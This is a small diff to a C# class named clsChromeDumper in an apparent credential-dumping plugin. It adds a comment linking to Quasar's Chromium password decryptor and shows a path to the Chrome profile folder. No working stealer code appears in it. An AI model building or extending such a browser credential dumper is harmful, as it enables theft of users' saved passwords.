@@ -27,7 +27,7 @@ namespace Plugin48Dumper
     public class clsChromeDumper : clsDumper
     {
         /// <summary>
-        /// 
+        /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
         /// </summary>
 
         private string ChromeDir { get { return Path.Combine(ApplicationData, "Google"); } }
